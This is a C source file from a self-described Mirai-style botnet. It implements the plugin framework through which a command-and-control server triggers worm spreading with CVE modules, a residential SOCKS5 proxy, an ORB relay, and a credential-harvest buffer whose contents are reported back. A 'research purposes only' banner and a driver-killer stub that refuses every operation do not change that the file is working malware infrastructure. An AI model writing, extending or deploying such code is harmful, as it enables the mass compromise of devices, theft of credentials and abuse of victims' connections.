/*
 * notnet - Modern Mirai-Style Botnet
 * plugin.c - Loader/plugin framework (#92)
 *
 * The Bredolab/Emotet model: the core bot stays a minimal loader and
 * capabilities are pushed post-infection, dispatched by name from the
 * C2. v1 implements the built-in registry — spread, proxy, relay, and
 * cred-log are compile-time linked plugins; the C2 `plugin` command
 * drives their lifecycle (load/run/unload/status). Existing module
 * behavior is unchanged: the plugins merely wrap the modules' own
 * entry points (spread_local, proxy_start/stop, relay_start/stop).
 *
 * Remote fetch of shared-object plugins (the full Bredolab/Emotet
 * pattern) is planned future work — see README. It must reuse the
 * fail-closed SHA-256 pinning of the payload path (payload_sha256).
 *
 * Research purposes only.
 */
#include "plugin.h"
#include "spread.h"
#include "proxy.h"
#include "relay.h"
#include "util.h"
#include <stdio.h>
#include <string.h>

/* ── Built-in plugin callbacks ─────────────────────────────── */

/* spread: multi-vector spreader + known-CVE modules (#83). Stateless —
 * the main loop already runs spread_local() when the primary C2 is
 * unreachable; the plugin entry lets the C2 trigger a cycle on demand.
 * load/unload are no-ops (there is nothing to initialize or stop). */
static int plg_spread_load(notnet_bot_t *bot) { (void)bot; return 0; }
static int plg_spread_run(notnet_bot_t *bot) { return spread_local(bot); }
static int plg_spread_unload(notnet_bot_t *bot) { (void)bot; return 0; }

/* proxy: residential SOCKS5 forward proxy (#89). run starts the
 * accept thread (fail-closed: refused without a proxy_token), unload
 * stops it. */
static int plg_proxy_load(notnet_bot_t *bot) { (void)bot; return 0; }
static int plg_proxy_run(notnet_bot_t *bot) { return proxy_start(bot); }
static int plg_proxy_unload(notnet_bot_t *bot) { (void)bot; proxy_stop(); return 0; }

/* relay: ORB-style single-hop relay (#91). Same lifecycle as the
 * proxy — run starts the token-authenticated listener, unload stops
 * it. */
static int plg_relay_load(notnet_bot_t *bot) { (void)bot; return 0; }
static int plg_relay_run(notnet_bot_t *bot) { return relay_start(bot); }
static int plg_relay_unload(notnet_bot_t *bot) { (void)bot; relay_stop(); return 0; }

/* cred-log: smash-and-grab credential buffer (#90). Passive — the
 * spreaders feed it, so there is nothing to start or stop; the plugin
 * entry exists so the C2 manages the capability uniformly and
 * `plugin status` reports the buffered harvest. */
static int plg_creds_load(notnet_bot_t *bot) { (void)bot; return 0; }
static int plg_creds_run(notnet_bot_t *bot) { (void)bot; return 0; }
static int plg_creds_unload(notnet_bot_t *bot) { (void)bot; return 0; }

/* byovd: BYOVD defense-neutralization scaffold (#94). Defensive-only —
 * this repo deliberately ships NO driver-loading code. BYOVD
 * (bring-your-own-vulnerable-driver) is the commodity successor to
 * kernel rootkits (ESET catalogued ~90 EDR killers, 54 abusing a shared
 * pool of 35 legitimately signed drivers), but loading signed drivers is
 * Windows-only and would be weaponized code; the research stance is
 * document + detect, never deploy. Every op refuses with a clear log so
 * the C2 sees an explicit refusal instead of silent success, and boot
 * auto-load leaves it unloaded. When byovd_guard=1 the load callback
 * additionally reports that BYOVD-style driver abuse is blocked. */
static int plg_byovd_load(notnet_bot_t *bot) {
    log_warn("PLUGIN: byovd load refused - driver loading is not implemented "
             "on this platform (defensive-only scaffold, see references/byovd.md)");
    if (bot && bot->byovd_guard) {
        log_info("PLUGIN: byovd guard active - BYOVD-style driver abuse is blocked");
    }
    return -1;
}
static int plg_byovd_run(notnet_bot_t *bot) {
    (void)bot;
    log_warn("PLUGIN: byovd run refused - no driver-loading capability exists");
    return -1;
}
static int plg_byovd_unload(notnet_bot_t *bot) {
    (void)bot;
    log_warn("PLUGIN: byovd unload refused - never loaded, nothing to stop");
    return -1;
}

/* ── Registry ──────────────────────────────────────────────── */
static notnet_plugin_t g_plugins[PLUGIN_MAX_REGISTRY];
static int g_plugin_count = 0;

void plugin_init(void) {
    if (g_plugin_count > 0) return;   /* idempotent */

    g_plugins[g_plugin_count++] = (notnet_plugin_t){
        "spread", "multi-vector spreader + CVE modules (#83)",
        plg_spread_load, plg_spread_run, plg_spread_unload, 0 };
    g_plugins[g_plugin_count++] = (notnet_plugin_t){
        "proxy", "residential SOCKS5 forward proxy (#89)",
        plg_proxy_load, plg_proxy_run, plg_proxy_unload, 0 };
    g_plugins[g_plugin_count++] = (notnet_plugin_t){
        "relay", "ORB-style single-hop relay (#91)",
        plg_relay_load, plg_relay_run, plg_relay_unload, 0 };
    g_plugins[g_plugin_count++] = (notnet_plugin_t){
        "cred-log", "credential-log harvest buffer (#90)",
        plg_creds_load, plg_creds_run, plg_creds_unload, 0 };
    g_plugins[g_plugin_count++] = (notnet_plugin_t){
        "byovd", "BYOVD defense scaffold (#94) - defensive-only, refuses all ops",
        plg_byovd_load, plg_byovd_run, plg_byovd_unload, 0 };

    log_info("PLUGIN: registry initialized (%d built-in plugins)",
             g_plugin_count);
}

void plugin_load_all(notnet_bot_t *bot) {
    for (int i = 0; i < g_plugin_count; i++) {
        if (g_plugins[i].loaded) continue;
        if (g_plugins[i].load && g_plugins[i].load(bot) == 0) {
            g_plugins[i].loaded = 1;
        } else {
            log_warn("PLUGIN: %s not loaded at boot (load refused)",
                     g_plugins[i].name);
        }
    }
    log_info("PLUGIN: %d/%d built-in plugins loaded",
             plugin_loaded_count(), g_plugin_count);
}

notnet_plugin_t *plugin_find(const char *name) {
    if (!name) return NULL;
    for (int i = 0; i < g_plugin_count; i++) {
        if (strcmp(g_plugins[i].name, name) == 0) {
            return &g_plugins[i];
        }
    }
    return NULL;
}

int plugin_load(notnet_bot_t *bot, const char *name) {
    notnet_plugin_t *p = plugin_find(name);
    if (!p) return -1;
    if (p->loaded) {
        log_warn("PLUGIN: %s already loaded", name);
        return -1;
    }
    if (p->load && p->load(bot) != 0) {
        log_warn("PLUGIN: %s load callback failed", name);
        return -1;
    }
    p->loaded = 1;
    log_info("PLUGIN: %s loaded", name);
    return 0;
}

int plugin_run(notnet_bot_t *bot, const char *name) {
    notnet_plugin_t *p = plugin_find(name);
    if (!p) return -1;
    if (!p->loaded) {
        log_warn("PLUGIN: %s run refused - not loaded", name);
        return -1;
    }
    if (p->run && p->run(bot) != 0) {
        log_warn("PLUGIN: %s run failed", name);
        return -1;
    }
    log_info("PLUGIN: %s ran", name);
    return 0;
}

int plugin_unload(notnet_bot_t *bot, const char *name) {
    notnet_plugin_t *p = plugin_find(name);
    if (!p) return -1;
    if (!p->loaded) {
        log_warn("PLUGIN: %s unload refused - not loaded", name);
        return -1;
    }
    if (p->unload && p->unload(bot) != 0) {
        log_warn("PLUGIN: %s unload callback failed", name);
        return -1;
    }
    p->loaded = 0;
    log_info("PLUGIN: %s unloaded", name);
    return 0;
}

/* Teardown every loaded plugin via its unload (stop) callback —
 * proxy_stop()/relay_stop() are idempotent, so double-stops from the
 * boot-time accept threads and the C2 `kill` path are safe. A failing
 * callback is logged and the plugin is still marked unloaded (kill
 * must not wedge on a stubborn plugin). */
void plugin_unload_all(notnet_bot_t *bot) {
    for (int i = 0; i < g_plugin_count; i++) {
        if (!g_plugins[i].loaded) continue;
        if (g_plugins[i].unload && g_plugins[i].unload(bot) != 0) {
            log_warn("PLUGIN: %s unload callback failed during teardown",
                     g_plugins[i].name);
        }
        g_plugins[i].loaded = 0;
        log_info("PLUGIN: %s unloaded", g_plugins[i].name);
    }
    log_info("PLUGIN: all plugins unloaded (%d/%d)",
             g_plugin_count - plugin_loaded_count(), g_plugin_count);
}

void plugin_status(char *buf, size_t len) {
    if (!buf || len == 0) return;
    size_t off = 0;
    for (int i = 0; i < g_plugin_count && off < len; i++) {
        int n;
        if (strcmp(g_plugins[i].name, "cred-log") == 0) {
            n = snprintf(buf + off, len - off, "%s[%s] %s (buffered: %u)\n",
                         g_plugins[i].loaded ? "*" : " ", g_plugins[i].name,
                         g_plugins[i].description, spread_cred_count());
        } else {
            n = snprintf(buf + off, len - off, "%s[%s] %s\n",
                         g_plugins[i].loaded ? "*" : " ", g_plugins[i].name,
                         g_plugins[i].description);
        }
        if (n < 0) break;
        if ((size_t)n >= len - off) break;   /* truncated — stop writing */
        off += (size_t)n;
    }
    buf[off] = '\0';
}

int plugin_count(void) {
    return g_plugin_count;
}

int plugin_loaded_count(void) {
    int n = 0;
    for (int i = 0; i < g_plugin_count; i++) {
        if (g_plugins[i].loaded) n++;
    }
    return n;
}
